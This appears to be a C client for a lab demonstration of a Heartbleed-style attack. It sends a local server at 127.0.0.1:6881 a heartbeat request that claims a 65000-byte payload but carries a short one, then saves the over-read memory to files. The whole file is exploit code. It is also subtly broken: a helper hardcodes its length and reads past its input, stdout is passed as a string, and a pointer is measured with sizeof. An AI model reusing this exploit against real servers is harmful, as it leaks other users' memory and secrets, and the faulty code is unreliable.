#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <string.h>
#include <limits.h>
#include <errno.h>

char *stringToBinary(char *s)
{
    if (s == NULL) {
        // NULL might be 0 but you cannot be sure about it
        return NULL;
    }
    // get length of string without NUL
    size_t slen = 65000;

    // we cannot do that here, why?
    // if(slen == 0){ return s;}

    errno = 0;
    // allocate "slen" (number of characters in string without NUL)
    // times the number of bits in a "char" plus one byte for the NUL
    // at the end of the return value
    char *binary = malloc(slen * CHAR_BIT + 1);
    if(binary == NULL){
        fprintf(stderr,"malloc has failed in stringToBinary(%s): %s\n",s, strerror(errno));
        return NULL;
    }
    // finally we can put our shortcut from above here
    if (slen == 0) {
        *binary = '\0';
        return binary;
    }
    char *ptr;
    // keep an eye on the beginning
    char *start = binary;
    int i,n;

    // loop over the input-characters
    ptr = s;
    //for (ptr = s; *ptr != 'corinthians'; ptr++) {
    for(n = 0; n < 65000; n++){
        /* perform bitwise AND for every bit of the character */
        // loop over the input-character bits
        for (i = CHAR_BIT - 1; i >= 0; i--, binary++) {
          *binary = (*ptr & 1 << i) ? '1' : '0';
        }
        ptr++;
    }
    // finalize return value
    *binary = '\0';
    // reset pointer to beginning
    binary = start;
    return binary;
}

int configuracaoCliente()
{
    int clienteSockfd;
    struct sockaddr_in serv_addr;
    socklen_t addrlen = sizeof (serv_addr);
    clienteSockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clienteSockfd < 0)
    {
        printf("Erro no Socket\n");
        exit(1);
    }
    bzero((char *) & serv_addr, sizeof (serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_port = htons(6881);
    if(connect(clienteSockfd,(struct sockaddr *)&serv_addr, addrlen) < 0)
    {
        printf("Erro no Socket\n");
        exit(1);
    }
    return clienteSockfd;
}
 
void Cliente(int clienteSockfd)
{
    char buffer_do_servidor[256];
    printf("Making a heartbeat request...\n");

    char type[12];
    char payload_size[12];
    char payload[256];

    strcpy(type,"1");
    strcpy(payload_size,"65000");
    strcpy(payload,"AMALICIOUSPAYLOAD");

    char *blood_buffer = malloc(atoi(payload_size));

    printf("Sending request type...\n");
    write(clienteSockfd, type, sizeof(type));
    bzero(buffer_do_servidor, sizeof (buffer_do_servidor));

    read(clienteSockfd, buffer_do_servidor, sizeof (buffer_do_servidor));
    printf("Recieved : %s\n",buffer_do_servidor);
    bzero(buffer_do_servidor, sizeof (buffer_do_servidor));

    
    printf("Sending payload size...\n");
    write(clienteSockfd, payload_size, sizeof(payload_size));

    read(clienteSockfd, buffer_do_servidor, sizeof (buffer_do_servidor));
    printf("Recieved : %s\n",buffer_do_servidor);
    bzero(buffer_do_servidor, sizeof (buffer_do_servidor));

    printf("Sending payload...\n");
    write(clienteSockfd, payload, sizeof(payload));

    printf("Waiting answer...\n");
    bzero(blood_buffer, sizeof (blood_buffer));
    read(clienteSockfd, blood_buffer, atoi(payload_size));
    printf("Recieved (%d bytes) : %s\n",atoi(payload_size),blood_buffer);

    FILE *fp;
    fp = fopen( "heartbleed_output.txt" , "w" );
    fwrite(blood_buffer, 1, atoi(payload_size), fp);
    fclose(fp);

    char *output_binary = stringToBinary(stdout);
    printf("[length: %d] : %s\n",strlen(output_binary),output_binary);

    fp = fopen( "heartbleed_output_binary.txt" , "w" );
    fwrite(output_binary, 1, atoi(payload_size), fp);
    fclose(fp);

    close(clienteSockfd);
}
 
int main()
{
    struct sockaddr_in serv_addr;
    socklen_t addrlen = sizeof (serv_addr);
    int descritorCliente;
    descritorCliente = configuracaoCliente();
    Cliente(descritorCliente);
    exit(0);
}
